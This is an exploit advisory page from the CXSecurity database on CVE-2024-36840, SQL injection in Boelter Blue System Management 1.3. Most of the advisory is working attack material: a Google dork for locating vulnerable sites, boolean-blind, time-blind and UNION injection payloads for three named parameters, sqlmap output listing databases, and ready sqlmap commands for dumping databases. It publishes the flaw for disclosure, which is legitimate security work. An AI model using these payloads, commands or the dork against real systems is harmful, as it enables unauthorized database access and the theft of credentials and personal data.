---
title: Boelter Blue System Management 1.3 SQL Injection
url: https://cxsecurity.com/issue/WLB-2024060019
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2024-06-08
fetch_date: 2025-10-06T16:54:32.127905
---

# Boelter Blue System Management 1.3 SQL Injection

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **Boelter Blue System Management 1.3 SQL Injection** **2024.06.07**  Credit:  **[CBKB](https://cxsecurity.com/author/CBKB/1/)**  Risk: **Medium**  Local: **No**  Remote: ****Yes****  CVE: **[CVE-2024-36840](https://cxsecurity.com/cveshow/CVE-2024-36840/ "Click to see CVE-2024-36840")**  CWE: **[CWE-89](https://cxsecurity.com/cwe/CWE-89 "Click to see CWE-89")**  **[**Dork:** inurl:"Powered by Boelter Blue"](https://cxsecurity.com/dorks/)** | |

Exploit Title: SQL Injection Vulnerability in Boelter Blue System Management (version 1.3)
Google Dork: inurl:"Powered by Boelter Blue"
Date: 2024-06-04
Exploit Author: CBKB (DeadlyData, R4d1x)
Vendor Homepage: https://www.boelterblue.com
Software Link: https://play.google.com/store/apps/details?id=com.anchor5digital.anchor5adminapp&hl=en\_US
Version: 1.3
Tested on: Linux Debian 9 (stretch), Apache 2.4.25, MySQL >= 5.0.12
CVE: CVE-2024-36840
Vulnerability Details:
Multiple SQL Injection vulnerabilities were discovered in Boelter Blue System Management (version 1.3). These vulnerabilities allow attackers to execute arbitrary SQL commands through the affected parameters. Successful exploitation can lead to unauthorized access, data leakage, and account takeovers.
PoC:
web server operating system: Linux Debian 9 (stretch)
web application technology: Apache 2.4.25
back-end DBMS: MySQL >= 5.0.12
[22:21:39] [INFO] fetching database names
available databases [5]:
[\*] Anchor5Digital
1. news\_details.php?id parameter:
Type: Boolean-based blind
Payload: id=10071 AND 4036=4036
Type: Time-based blind
Payload: id=10071 AND (SELECT 4443 FROM (SELECT(SLEEP(5)))LjOd)
Type: UNION query
Payload: id=-5819 UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x7170766b71,0x646655514b72686177544968656d6e414e4678595a666f77447a57515750476751524f5941496b55,0x7162626a71),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--
Example SQLMap Command: sqlmap -u "https://www.example.com/news\_details.php?id=10071" --random-agent --dbms=mysql --threads=4 --dbs
2. services.php?section parameter:
Type: Boolean-based blind
Payload: section=(SELECT (CASE WHEN (1087=1087) THEN 5081 ELSE (SELECT 8711 UNION SELECT 5881) END))
Type: Time-based blind
Payload: section=5081 AND (SELECT 2101 FROM (SELECT(SLEEP(5)))nmcL)
Example SQLMap Command: sqlmap -u "https://www.example.com/services.php?section=5081" --random-agent --tamper=space2comment --threads=8 --dbs
3. location\_details.php?id parameter:
Type: Boolean-based blind
Payload: id=836 AND 4036=4036
Type: Time-based blind
Payload: id=836 AND (SELECT 4443 FROM (SELECT(SLEEP(5)))LjOd)
Type: UNION query
Payload: id=-5819 UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x7170766b71,0x646655514b72686177544968656d6e414e4678595a666f77447a57515750476751524f5941496b55,0x7162626a71),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--
Example SQLMap Command: sqlmap -u "https://www.example.com/location\_details.php?id=836" --random-agent --dbms=mysql --dbs
Impact:
Unauthorized access to the database.
Extraction of sensitive information such as admin credentials, user email/passhash, device hashes, user PII, purchase history, and database credentials.
Account takeovers and potential full control of the affected application.
Discoverer(s)/Credits:
CBKB (DeadlyData, R4d1x)
References:
https://infosec-db.github.io/CyberDepot/vuln\_boelter\_blue/https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-36840

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2024060019)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top